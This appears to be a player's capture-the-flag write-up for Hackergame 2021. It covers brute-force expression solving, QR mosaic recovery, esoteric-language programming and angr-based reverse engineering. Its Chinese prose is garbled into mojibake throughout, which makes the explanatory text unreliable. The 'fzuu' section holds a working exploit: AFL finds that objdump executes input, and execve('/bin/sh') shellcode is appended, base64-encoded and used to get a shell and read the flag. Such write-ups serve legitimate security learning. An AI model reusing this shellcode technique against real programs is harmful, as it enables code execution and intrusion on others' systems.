        return (a + b) % BOUNDRY

    def div(self, a, b):
        return BOUNDRY - 1 if b == 0 else a // b

    def mod(self, a, b):
        return a if b == 0 else a % b

    def __init__(self):
        self.vars = {}

    def assign(self, x, y):
        self.vars['x'] = x
        self.vars['y'] = y

    def var(self, name):
        if name[0] not in self.vars.keys():
            return 0
        return self.vars[name[0]]
```

å†å®šä¹‰ä¸€ä¸ªå¦‚æœé¢˜ç›®å¤ªç®€å•ç›´æ¥è·³è¿‡çš„å¤„ç†ï¼š
```py
def solve_easy(problems):
    easy = True
    for item in problems: # å¦‚æœå…¨æ˜¯ 0
        if item[2] != 0:
            easy = False
            break
    if easy:
        io.sendline(b'x-x')
        return True
    easy = True
    for item in problems:
        if item[2] != BOUNDRY - 1: # å¦‚æœå…¨æ˜¯ 2^36 - 1
            easy = False
            break
    if easy:
        io.sendline(b'x/(x-x)')
        return True
    return False
```

ä¹‹åå°±æ˜¯**è¶…çº§æ— æ•Œå¤§åŠ›**çš„æš´åŠ›åŠ æ— è„‘äº†ï¼ˆå®Œå…¨æ²¡æœ‰ä¸Šä¸€é—®çš„ä¼˜é›…ï¼‰ï¼š
```py
io = init_conn(token)
convertor = Convertor()
assign = convertor.assign
calc = init_parser(convertor).parse

for _ in range(10):
    problems = get_problem() # è·å–é¢˜ç›®
    if solve_easy(problems): # å¤„ç†ç®€å•é¢˜
        continue

    equals = {} # ç­‰å¼å­—å…¸
    for idx, problem in enumerate(problems): # å¯¹äºæ¯é“é¢˜ç›®
        assign(problem[0], problem[1]) # æ›´æ”¹è§£æå™¨å½“å‰çš„ x, y
        for expr in gen_expr(): # ç”Ÿæˆè¡¨è¾¾å¼
            res = calc(expr) # è®¡ç®—è¡¨è¾¾å¼
            if res == problem[2]: # ä¸€æ ·å°±æ·»åŠ è¿›å­—å…¸
                equals[idx] = expr
                break
            elif (-res) % BOUNDRY == problem[2]: # åˆšå¥½å–åä¹Ÿå¯ä»¥æ·»åŠ 
                equals[idx] = f'(-{expr})'
                break

    if len(equals.keys()) < 5: # å¦‚æœæœ‰æ²¡æœ‰ç©·ä¸¾å‡ºæ¥çš„ï¼Œç›´æ¥è·³è¿‡ï¼ˆä»»æ€§
        io.sendline()
        continue

    use = {}

    for i in range(5):
        x = problems[i][0] # å–å½“å‰çš„ x å€¼
        for expr in gen_expr():
            assign(problems[i][0], problems[i][1])
            if x > calc(expr):  # ç©·ä¸¾å…¨éƒ¨èƒ½å¤Ÿä½¿å¾—å½“å‰é—®é¢˜çš„å¸ƒå°”æ¡ä»¶æˆç«‹â€¦â€¦
                continue

            fail = False
            for j in range(5): # â€¦â€¦å¹¶ä¸”å…¶ä½™ä¸€æ¦‚ä¸æˆç«‹çš„è¡¨è¾¾å¼
                if i == j:
                    continue
                assign(problems[j][0], problems[j][1])
                if problems[j][0] <= calc(expr):
                    fail = True
                    break
            if fail:
                continue

            use[i] = expr
            break

    if len(use.keys()) < 4: # è‡³å°‘éœ€è¦ç”¨å››ä¸ªï¼Œä¸è¶³å››ä¸ªç›´æ¥è·³è¿‡ï¼ˆç»§ç»­ä»»æ€§
        io.sendline()
        continue

    no_use = set(range(5)) - set(use.keys())
    if len(no_use) > 0:
        no_use = list(no_use)[0]
    else:
        no_use = 4
        use.pop(4)

    # æ ¼å¼åŒ–ä¸º if(x<=a,b,if(x<=c,d,if(x<=e,f,if(x<=g,h,i)))) ç›´æ¥è¾“å‡º
    result = equals[no_use]
    for item in use.keys():
        result = f'if(x<={use[item]},{equals[item]},{result})'

    io.sendline(result)

io.recvall()
```

æ²¡æƒ³åˆ°æ•ˆæœç‰¹åˆ«å¥½ï¼Œå‡†ç¡®ç‡è¿˜ç‰¹åˆ«é«˜ï¼Œè¿™ä¸€å®šæ˜¯å‡ºé¢˜äººçš„é—®é¢˜ï¼ˆé€ƒ

**flag{dIdy0uUseCvC5?-c0a8a4432c}**

## é©¬èµ›å…‹

äºŒç»´ç ä¸€ç›´éƒ½æ˜¯ `NanoApe` çš„æ‹¿æ‰‹èœï¼Œè¿™é“ä¹Ÿä¸ä¾‹å¤–ï¼Œä»–ä¹Ÿæ‹¿äº†ä¸ªä¸€è¡€ï¼ˆ

æˆ‘åšè¿™é“é¢˜çš„è¿‡ç¨‹æ˜¯æ¯”è¾ƒåå·çš„ï¼Œå› ä¸ºæ€è·¯æ–¹å‘é”™è¯¯å¯¼è‡´äº†ä¸€äº›å¾ˆå¥‡è‘©çš„é—®é¢˜â€¦â€¦è¿˜å¥½åæœŸæˆåŠŸæ”¹æ­£å¥½äº†ã€‚

è¿™é“é¢˜æœ€å¤§çš„å…¥æ‰‹ç‚¹æ˜¯**å¤§éƒ¨åˆ†çš„æ–¹å—æ˜¯ä¸å¯¹é½çš„**ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¡¥å…¨å¤§éƒ¨åˆ†çš„æ–¹æ ¼ï¼Œåœ¨æ­¤ä¹‹ä¸Šç©·ä¸¾å°‘é‡çš„æ–¹æ ¼å°±å¯ä»¥æ‰¾åˆ°æ­£ç¡®ç­”æ¡ˆï¼Œè€Œè¿™ç§æ–¹æ ¼çš„å¸ƒå±€æ˜¯ä»äºŒç»´ç å‘¨å›´å¼€å§‹ï¼Œæ‰€ä»¥æˆ‘ä»¬è€ƒè™‘ä»¥èºæ—‹éå†çš„é¡ºåºè¿›è¡Œè¡¥å…¨ã€‚

æœç´¢äºŒç»´ç å¯è¡Œè§£çš„ä¸»è¦é€»è¾‘ï¼š
```py
for allow in [1, 2, 3, 4, 50, 1024]: # å¯æ¥å—çš„è§£çš„ä¸ªæ•°çš„é˜ˆå€¼
    bar = tqdm(get_dir_matrix(N), total = N * N) # ç”Ÿæˆä¸€ä¸ªçŸ©é˜µçš„èºæ—‹éå†ï¼Œç”±å¤–å‘å†…è¿›è¡Œæœç´¢

    for i, j in bar:
        bar.set_description(f'now at ({i: 2},{j: 2}) ')
        ox1, ox2, oy1, oy2, result = search(i, j, pixels) # æœç´¢å½“å‰ä½ç½®çš„å¯è¡Œè§£
        valid = [i[1] for i in result if i[0] == 0] # åªå–å…¶ä¸­è¯¯å·®ä¸º 0 çš„

        if 0 < len(valid) <= allow: # å¯¹äº 1 ~ allow ä¸ªæ•°çš„è§£
            res = random.choice(valid) # éšæœºå–ä¸€ä¸ªï¼ŒäºŒç»´ç æœ‰çº é”™
            for x in range(ox1, ox2):
                for y in range(oy1, oy2):
                    if pixels[x][y] == 2: # æ²¡æœ‰è¢«ä¸Šè‰²æ‰ä¸Šè‰²
                        pixels[x][y] = res[x - ox1][y - oy1]
                    elif pixels[x][y] != res[x - ox1][y - oy1]: # å¦‚æœå·²ç»ä¸Šè‰²çš„é¢œè‰²ä¸ç¬¦åˆ™è¾“å‡º
                        print(f'warning!! can not solve pixel ({x}, {y})')
```

å¯¹äºæ¯ä¸€ä¸ªåŒºå—çš„å¯è¡Œè§£ï¼š
```py
def dfs(positions, explore, judge):
    if len(positions) != 0:
        possibilities = []
        x, y = positions[0]
        for case in [0, 1]:
            explore[x][y] = case
            possibilities += dfs(positions[1:], explore, judge)
        explore[x][y] = 2
        return possibilities
    else:
        # å†æ— ç©ºçš„å…ƒç´ æ—¶å€™åˆ¤å®šç°åº¦å€¼
        return [(judge(explore), explore.copy())]


# for block (i, j)
def search(i, j, pixel_data):
    # left top corner
    x, y = X + i * BOX_SIZE, Y + j * BOX_SIZE

    # range of pixels to generate one mosaic block
    # left top corner of pixels
    ld_x, ld_y = x // PIXEL_SIZE, y // PIXEL_SIZE
    # right bottom corner of pixels
    up_x, up_y = (x + BOX_SIZE) // PIXEL_SIZE + 1, (y + BOX_SIZE) // PIXEL_SIZE + 1

    # range of current mosaic block in original image
    # left top corner of original image
    ox1, oy1 = X + i * BOX_SIZE, Y + j * BOX_SIZE
    # right bottom corner of original image
    ox2, oy2 = X + (i + 1) * BOX_SIZE, Y + (j + 1) * BOX_SIZE

    # range of current mosaic block in expanded pixels block
    # left top corner of expanded pixels
    x1, y1 = ox1 - ld_x * PIXEL_SIZE, oy1 - ld_y * PIXEL_SIZE
    # right bottom corner of expanded pixels
    x2, y2 = ox2 - ld_x * PIXEL_SIZE, oy2 - ld_y * PIXEL_SIZE

    raw = pixel_data[ld_x: up_x, ld_y: up_y].copy()
    positions = [i for i in zip(*np.where(raw == 2))]

    def judge(part):
        part = scale_(part, PIXEL_SIZE)
        part = (part == 0) * 255
        part = part.astype('uint8')[x1: x2, y1: y2]
        opart = orignal_data[ox1: ox2, oy1: oy2].copy()
        assert(opart.shape == part.shape)
        assert(np.min(opart == mosaic[i][j]))
        loss = np.abs(mosaic[i][j] - math.floor(part.mean()))
        return loss

    result = dfs(positions, raw, judge)
    result.sort(key = lambda pa: pa[0])

    return (ld_x, up_x, ld_y, up_y, result)
```

å¯¹äºä¸€äº›å·¥å…·å‡½æ•°çš„å®ç°ã€äºŒç»´ç æ‰«æåº“ `pyzbar` çš„ä½¿ç”¨ã€ç»˜å›¾ã€è£å‰ªã€ç¼©æ”¾ `numpy` æ•°ç»„ç­‰æ“ä½œå¯ä»¥åœ¨ä»£ç ä»“åº“ä¸­æŸ¥çœ‹ï¼š[solve.ipynb](https://github.com/USTC-Hackergame/hackergame2021-writeups/tree/master/players/GZTime/scripts/mosaic/solve.ipynb)

**flag{QRcodes_are_pixel_arts_EvSwCSAWtP}**

## JUST BE FUN

ä»å®˜æ–¹ wp ä¸­æ‰çœ‹åˆ°è¿™æ˜¯åœ¨è€ƒå¯Ÿ[EsoLang](https://zh.wikipedia.org/wiki/%E6%B7%B1%E5%A5%A5%E7%9A%84%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80)çš„ç†è§£å’Œç¼–å†™ï¼Œä¸å»å¹´çš„`brainfuck`ç›¸ä¼¼ï¼Œå†™çš„æ—¶å€™å¾ˆå¥½ç©ã€‚

`mcfx`å’Œ`NanoApe`æ˜¯å†™äº†ä¸€ä¸ªæ±‡ç¼–å™¨ï¼Œå¯¹äºè¿™ä¸ªä¸œè¥¿æˆ‘å€’æ˜¯è›®å¥½å¥‡çš„ï¼Œå›å¤´åº”è¯¥ä¼šå•ç‹¬å‡ºä¸€ä¸ªåšå®¢æ¥æ¢ç´¢ï¼ˆæŒ–å‘

è€Œæˆ‘åšè¿™é“é¢˜ï¼Œç›´æ¥å°† Excel å˜æˆäº† IDEï¼Œé¢å‘ Excel ç¼–ç¨‹ï¼Œå¯ä»¥æ„è¯†åˆ°ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ç»™å‡ºçš„è¿ç®—æ¥å®ç°å¦å¤–çš„å››ç§è¿ç®—ï¼Œäºæ˜¯æˆ‘çš„è®¡åˆ’ä¾¿æ˜¯ä»–ä»¬å„è‡ªä¸€å±‚ï¼š

![](https://cdn.gztime.cc/hg2021/fun_layer0.png)
<center>ç¬¬0å±‚</center>

è¿™ä¸€å±‚çš„ä¸»è¦ä»»åŠ¡æ˜¯ï¼š
- è¾“å…¥è¾“å‡º
    è¾“å…¥çš„æ•°å­—å­—ç¬¦éœ€è¦å‡å»`0`çš„asciiï¼Œä¹‹åè¾“å…¥è¿ç®—ç¬¦ï¼Œæ³¨æ„æ¯æ¬¡åˆ†æ”¯çš„æ—¶å€™éƒ½ä¼šç§»é™¤æ ˆé¡¶å…ƒç´ ï¼Œæ‰€ä»¥éœ€è¦æŒ‰æ—¶å¾—è¿›è¡Œæ ˆé¡¶å…ƒç´ çš„å¤åˆ¶(`:`)
- è¾“å…¥è¿ç®—ç¬¦åˆ†æ”¯çš„é€‰æ‹©
    è¾“å…¥ä¸€ä¸ªç¬¦å·ï¼Œåˆ¤æ–­ä½œå·®æ˜¯å¦ä¸º`0`è¿›è¡Œåˆ†æ”¯

![](https://cdn.gztime.cc/hg2021/fun_layer1.png)
<center>ç¬¬1å±‚</center>

è¿™ä¸€å±‚çš„ä¸»è¦ä»»åŠ¡æ˜¯å°†æ‰§è¡Œæµæ”¾åˆ°å·¦ä¾§ï¼Œä½¿å¾—ç¨‹åºå†™èµ·æ¥èˆ’æœã€‚åé¢å‘ç°è¿™é‡Œçš„ç©ºé—´åˆšåˆšå¥½å¯ä»¥ç”¨æ¥åšä¸€äº›è¿ç®—å‰çš„å‡†å¤‡å·¥ä½œï¼Œ**åˆå§‹åŒ–æ ˆç©ºé—´**ã€‚ä¸ºäº†é€»è¾‘çš„è¿ç»­æ€§ï¼Œè¿™éƒ¨åˆ†çš„æ“ä½œæˆ‘åœ¨ä¸‹é¢å±•å¼€ã€‚

ä¸ºæ–¹ä¾¿è§£é‡Šï¼Œæ ˆç”¨`[a, b, c, ...]`çš„å½¢å¼è¡¨ç¤ºï¼Œä»¥å³ä¾§ä¸ºæ ˆé¡¶ã€‚

![](https://cdn.gztime.cc/hg2021/fun_layer2.png)
<center>ç¬¬2å±‚</center>

è¿™ä¸€å±‚çš„ç›®æ ‡æ˜¯å®Œæˆä¹˜æ–¹è®¡ç®—ï¼Œç”±äºç³»æ•°ä¸è¶…è¿‡åï¼Œä¹Ÿå°±æ²¡å¿…è¦åšå¿«é€Ÿå¹‚äº†ï¼ˆé€ƒ

è¿™ä¸€å±‚çš„æ ˆç©ºé—´ä¸ºï¼š`[ans, base, times, continue]`

- `ans`: ç­”æ¡ˆ
- `base`: ä¹˜æ–¹çš„åº•æ•°
- `times`: å¾ªç¯æ¬¡æ•°ï¼Œåˆå§‹åŒ–ä¸ºæŒ‡æ•°å‡ä¸€
- `continue`: ä»¥æ­¤ä¸ºæ ˆé¡¶å…ƒç´ æ¥åˆ¤æ–­æ˜¯å¦ç»§ç»­å¾ªç¯

æ“ä½œæµç¨‹ï¼š

1. åˆ¤æ–­`continue`å†³å®šæ˜¯å¦ç»§ç»­ï¼Œä¸­æ­¢åˆ™è·³è½¬åˆ°`7`
2. è°ƒæ•´æ ˆç©ºé—´ä¸ºï¼š`[times, base, ans, base]`
3. åšä¹˜æ³•ï¼Œå¾—åˆ°æ–°çš„`ans`
4. è°ƒæ•´æ ˆç©ºé—´ä¸ºï¼š`[ans, base, times]`
5. åšå‡æ³•ï¼Œå¾ªç¯æ¬¡æ•°å‡ä¸€ï¼Œå¾—åˆ°æ–°çš„`times`
6. å¤åˆ¶`times`å–åå¾—åˆ°`continue`ï¼Œè·³è½¬åˆ°`1`
7. å¼¹å‡ºæ ˆé¡¶ä¸¤å…ƒç´ ï¼Œç•™ä¸‹`ans`è¿”å›

![](https://cdn.gztime.cc/hg2021/fun_layer3.png)
<center>ç¬¬3å±‚</center>

è¿™ä¸€å±‚æ˜¯å·¦ç§»ï¼Œç”±äº $a << b = a * 2 ^ b$ ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°† `a` æ”¾åœ¨æ ˆåº•ï¼Œæ„é€  $2 ^ b$ çš„æ ˆé¡¶ç»“æ„ï¼Œè¿›è¡Œä¸ä¹˜æ–¹ç›¸åŒçš„è®¡ç®—ã€‚

è¿™ä¸€å±‚çš„æ ˆç©ºé—´ä¸ºï¼š`[number, powres, 2, times, continue]`

- `number`: è¢«å·¦ç§»çš„æ•°
- `powres`: ä¹˜æ–¹çš„ç»“æœ

æ“ä½œæµç¨‹ï¼š

1. åœ¨å½“å‰æ ˆç©ºé—´æ‰§è¡Œä¹˜æ–¹çš„æµç¨‹ï¼Œå¾—åˆ°`[number, powres]`
2. ç›´æ¥åšä¹˜æ³•

![](https://cdn.gztime.cc/hg2021/fun_layer4.png)
<center>ç¬¬4å±‚</center>

æˆ–çš„æ“ä½œè¦æ›´åŠ å¤æ‚ä¸€äº›ï¼Œè¿™é‡Œçš„ä¼ªä»£ç å¯ä»¥è§†ä½œï¼š
```py
tmp = 0
count = 0
while a + b != 0:
    bit = !!(a % 2 + b % 2)
    a /= 2
    b /= 2
    tmp = tmp * 2 + bit
    count += 1
# è¿™é‡Œå¾—åˆ°çš„ç»“æœå°šæœªæ˜¯æœ€ç»ˆç»“æœï¼ŒäºŒè¿›åˆ¶ä½æ°å¥½è°ƒè½¬
ans = 0
while count > 0:
    bit = tmp % 2
    ans = ans * 2 + bit
    tmp /= 2
    count -= 1
# è¿™é‡Œçš„ ans å°±æ˜¯æœ€ç»ˆçš„ç»“æœäº†
```

è¿™ä¸€å±‚ç¬¬ä¸€éƒ¨åˆ†çš„æ ˆç©ºé—´ä¸ºï¼š`[count, ans, a, b, continue]`

- `count`: ä½æ•°
- `ans`: æŒ‰ä½æˆ–çš„åè½¬ç»“æœ
- `a, b`: æ“ä½œæ•°
- `continue`: ä»¥æ­¤ä¸ºæ ˆé¡¶å…ƒç´ æ¥åˆ¤æ–­æ˜¯å¦ç»§ç»­å¾ªç¯

æ“ä½œæµç¨‹ï¼Œä¸ºæ–¹ä¾¿æˆ‘ç›´æ¥æ“ä½œæ ˆå†…æƒ…å†µï¼š

1. åˆ¤æ–­`continue`å†³å®šæ˜¯å¦ç»§ç»­ï¼Œä¸­æ­¢åˆ™è·³è½¬åˆ°`13`
2. `[ans, a, b, count + 1]`
3. `[count + 1, ans, a, b, b % 2]`
4. `[count + 1, ans, b % 2, b, a, a % 2]`
5. `[count + 1, ans, a, b, b % 2 + a % 2]`
6. `[count + 1, ans, a, b, bit]` (`bit = !!(b % 2 + a % 2)`)
7. `[count + 1, ans, a / 2, bit, b / 2, b / 2 + a / 2]`
8. `[count + 1, ans, a / 2, bit, b / 2, continue]` (`continue = b / 2 + a / 2`)
9. `[count + 1, continue, a / 2, b / 2, bit, ans]`
10. `[count + 1, continue, a / 2, b / 2, ans * 2 + bit]`
11. `[count + 1, ans * 2 + bit, a / 2, b / 2, continue]`
    -> `[count, ans, a, b, continue]`
12. `continue`å–åï¼Œè·³è½¬åˆ°`1`
13. å¼¹å‡ºæ ˆé¡¶ä¸¤å…ƒç´ ï¼Œç•™ä¸‹`count, ans`è¿”å›

è¿™ä¸€å±‚ç¬¬äºŒéƒ¨åˆ†çš„æ ˆç©ºé—´ä¸ºï¼š`[result, ans, count, continue]`

è¿™é‡Œçš„`continue`æ˜¯`count`æ¬¡å¾ªç¯çš„åˆ¤æ®ï¼Œä¸ä¸Šæ–‡ä¸åŒã€‚ä¸” `result = 0` ä¸ºåˆå§‹åŒ–æ—¶å€™å…¥æ ˆã€‚

æ“ä½œæµç¨‹ï¼ŒåŒæ ·ä¸ºæ–¹ä¾¿æˆ‘ç›´æ¥æ“ä½œæ ˆå†…æƒ…å†µï¼š

1. åˆ¤æ–­`continue`å†³å®šæ˜¯å¦ç»§ç»­ï¼Œä¸­æ­¢åˆ™è·³è½¬åˆ°`8`
2. `[count, ans, result * 2]`
3. `[count, result * 2, ans, ans % 2]`
4. `[count, ans, result * 2 + ans % 2]`
5. `[count, result * 2 + ans % 2, ans / 2]`
6. `[result * 2 + ans % 2, ans / 2, count - 1]`
    -> `[result, ans, count, continue]` (`continue = count`)
7. `continue`å–åï¼Œè·³è½¬åˆ°`1`
13. å¼¹å‡ºæ ˆé¡¶ä¸¤å…ƒç´ ï¼Œç•™ä¸‹`result`è¿”å›

![](https://cdn.gztime.cc/hg2021/fun_layer5.png)
<center>ç¬¬5å±‚</center>

å¼‚æˆ–å’Œæˆ–çš„å”¯ä¸€åŒºåˆ«åœ¨äºæŒ‰ä½ç®—æ—¶éœ€è¦æ›´æ”¹ä¸€ä¸‹ï¼Œå³ä¸Šè¿° `bit` çš„èµ‹å€¼ï¼š
`bit = (b % 2 + a % 2) % 2`

å…¶ä½™æ“ä½œå®Œå…¨ä¸€æ ·ï¼Œäºæ˜¯ç¿»è½¬çš„æ“ä½œä¹Ÿä¸‹æ”¾åˆ°ä¸Šä¸€å±‚è¿›è¡Œã€‚

æœ€åå°†å…¶ç»“æœè½¬æ¢ä¸ºæ‰€éœ€æ±‚çš„æ ¼å¼ï¼Œä¸Šä¼ å³å¯ã€‚

**flag{ju5t_b3_fun_00aacf491c}**

## fzuu

è¿›å…¥æ³¨ä¸‰æ‰€æŒ‡å‘çš„ç½‘å€ï¼Œå¯ä»¥çœ‹åˆ°ä»€ä¹ˆæ˜¯ AFLï¼šamerican fuzzy lopï¼Œç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡ç¼–è¯‘æ—¶æ’æ¡©ã€åˆ†æ”¯æ£€æµ‹ç­‰æ–¹å¼å¯»æ‰¾ç¨‹åºçš„æ¼æ´ï¼Œå¯¹äºè¿™é“é¢˜ï¼Œæˆ‘ä»¬ç”¨å…¶æ‰€ç»™çš„è·‘ä¸€ä¸‹ã€‚

æœ€å¼€å§‹ç”¨çš„å‚æ•°æœ‰é—®é¢˜ï¼Œfuzz äº†å¥½å‡ ä¸ªå°æ—¶éƒ½æ²¡æœ‰èƒ½ç”¨çš„ payloadï¼Œæœ€åæ‰å‘ç°æˆ‘æŠŠ `-d` å†™æˆäº† `-a`â€¦â€¦
```bash
$ afl-fuzz -i fuzz_in/ -o found ./objdump_afl -d @@
```

ç§ä»¥ä¸ºè¿™ä¸ªç•Œé¢çœŸå¸…ï¼š

![](https://cdn.gztime.cc/hg2021/fuzz.jpg)

å†ä¸€æ®µæ—¶é—´çš„è¿è¡Œä¹‹åï¼Œæˆ‘ä»¬å‘ç°äº†è¿™æ ·ä¸€ä¸ª payload:
```bash
$ ./objdump -d ./found/fuzzer5/crashes/id\:000000\,sig\:04\,src\:000063+000073\,op\:splice\,rep\:2
Illegal instruction

$ xxd ./found/fuzzer5/crashes/id\:000000\,sig\:04\,src\:000063+000073\,op\:splice\,rep\:2
00000000: 5331 3030 3030 30ff ffff ffff 7fff ff7b  S100000........{
```

äºæ˜¯ä½¿ç”¨ gdb è°ƒè¯•ï¼Œçœ‹çœ‹å‘ç”Ÿäº†ä»€ä¹ˆï¼Œåœ¨å´©æºƒå¤„ï¼š
```bash
 RIP  0x7fffffffced2 â—‚â€” 0x7bffff7fffffffff
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
Invalid instructions at 0x7fffffffced2
```

äºæ˜¯æ„è¯†åˆ°ï¼Œç¨‹åºå°†æˆ‘ä»¬çš„è¾“å…¥ä»ç¬¬å…«å­—èŠ‚å¼€å§‹ç›´æ¥æ‰§è¡Œäº†ï¼Œäºæ˜¯ç›´æ¥ä»[shell-strom](http://shell-storm.org/shellcode/)ä¸Šæ‰¾ä¸ª`shellcode`ï¼Œæ‹¼æ¥åæ‰§è¡Œï¼š

```py
from base64 import b64encode
code = b'S100000\xff1\xc0H\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xffH\xf7\xdbST_\x99RWT^\xb0;\x0f\x05'
open('exp.1.bin','wb').write(code)
print(b64encode(code))
```

æµ‹è¯•æ‰§è¡Œï¼š
```bash
â”Œâ”€â”€(userã‰¿GZTime-LAPTOP)-[/mnt/â€¦/CTF/hackergame2021/fzuu]
â””â”€$ ./objdump -d exp.1.bin
$ ls
exp.1.bin  exp.bin objdump  objdump.i64  objdump_afl
```

ç›´æ¥è·å– `shell`ï¼Œäºæ˜¯ä¸Šä¼ ï¼š
```bash
Input your payload in base64: UzEwMDAwMP8xwEi70Z2WkdCMl/9I99tTVF+ZUldUXrA7DwU=
ls
bin
flag.txt
lib
lib32
lib64
libx32
main.sh
objdump
cat flag.txt
flag{FuZzlng_Ls_uSeFuI_IN_Testing_e444e963fe}
```

**flag{FuZzlng_Ls_uSeFuI_IN_Testing_e444e963fe}**

## è¶… OI çš„ Writeup æ¨¡æ‹Ÿå™¨

~~å¥½æ¬¸ï¼Œæˆ‘ä¸Šç”µè§†äº†~~ï¼ŒæˆåŠŸè¢«å‡ºé¢˜äººå¼•ç”¨äº†hhhhh

è¿™æ¬¡æˆ‘çš„ç¡®æ²¡æœ‰åšä¸¤å°æ—¶äº†ï¼ˆé€ƒï¼Œè™½ç„¶äºŒè¿›åˆ¶è¿˜æ˜¯ä¸å¤Ÿå¼ºï¼Œæ²¡åšå‡ºæ¥ç¬¬ä¸‰é—®orzï¼Œæ—¢ç„¶åšäº†è‡ªåŠ¨åŒ–ï¼Œå‰ä¸¤é—®å°±ä¸€èµ·è§£äº†ã€‚

å…ˆç”¨ IDA æ‰“å¼€åˆ†æï¼Œå‘ç°ä¸è®ºæ˜¯å“ªä¸ªå‡½æ•°çš„è¾“å…¥éƒ½ä¼šè¢«å­˜å…¥ä¸¤ä¸ª `int64` ä¸­ï¼Œåœ¨ä¼ é€’è¿›å…¥å‡½æ•°æ—¶å€™çš„å¯„å­˜å™¨æ“ä½œæ˜¯ä¸€æ ·çš„ï¼š

![](https://cdn.gztime.cc/hg2021/re0.jpg)
<center>0.bin</center>


![](https://cdn.gztime.cc/hg2021/re1.jpg)
<center>1.bin</center>

å› æ­¤è¿™ä¸€éƒ¨åˆ†çš„ç‰¹å¾æ˜¯ç›¸åŒçš„ï¼Œæœ‰ç€ç›¸åŒçš„åå…­è¿›åˆ¶ç¼–ç ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä»¥æ­¤ç¡®å®š `call magic_function` çš„å…·ä½“åœ°å€ã€‚

å³å¯ä»¥æœç´¢ï¼š`488b45f04883c008488B10488B45F048` ç¡®å®šåœ°å€åç§»é‡ï¼Œè€Œæˆ‘ä»¬ç”¨ `angr` çš„åˆ†ææ“ä½œä¹Ÿå°±ä»è¿™é‡Œå¼€å§‹ã€‚

å¦‚æœä½ ä¸çŸ¥é“ `angr` æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥å…ˆè¡Œæœç´¢ä¸€ä¸‹ã€‚è€Œåˆ©ç”¨å®ƒï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¸¤ä¸ªå¯„å­˜å™¨çš„å€¼è®¾ç½®ä¸ºè¦æ±‚è§£çš„å¯¹è±¡ï¼Œå¹¶ä¸”å¯¹è¾“å‡ºé™åˆ¶ï¼Œä½¿å…¶è‡ªåŠ¨æ±‚è§£ã€‚

```py
# get the address of `call magic_function`
def get_addr(file):
    bin_ = open(file, 'rb').read()
    return bin_.find(bytes.fromhex('488b45f04883c008488B10488B45F048')) + 24

def succ(state):
    return b'Correct' in state.posix.dumps(1)

def fail(state):
    return b'Wrong' in state.posix.dumps(1)
```

è¿›è¡Œè‡ªåŠ¨æ±‚è§£ï¼š
```py
def solve(file):
    start = base + get_addr(file)

    p = angr.Project(file)

    init = p.factory.blank_state(addr = start)

    code1 = claripy.BVS('code1', 64)
    code2 = claripy.BVS('code2', 64)

    init.regs.rsi = code1
    init.regs.rdi = code2

    sim = p.factory.simgr(init)
    sim.explore(find=succ, avoid=fail)

    if len(sim.found) > 0:
        res = sim.found[0]
        a = res.solver.eval(code1)
        b = res.solver.eval(code2)
        result = bytes.fromhex(hex(a)[2:] + hex(b)[2:])[::-1]
        return result
    return 'Error!'
```

ä»¥æ­¤ä¼ å…¥æ–‡ä»¶ï¼Œå°±å¯ä»¥è‡ªåŠ¨æ±‚è§£äº†ï¼Œè‡ªåŠ¨åŒ–çœŸå¥½ï¼Œå¯ä»¥èººå¹³äº†ï¼

**flag{ESREVER_6224fc5dc9b92d57}**

**flag{Half_Bl00d_Automata_f2b40c2602965ee1}**

---

THE END
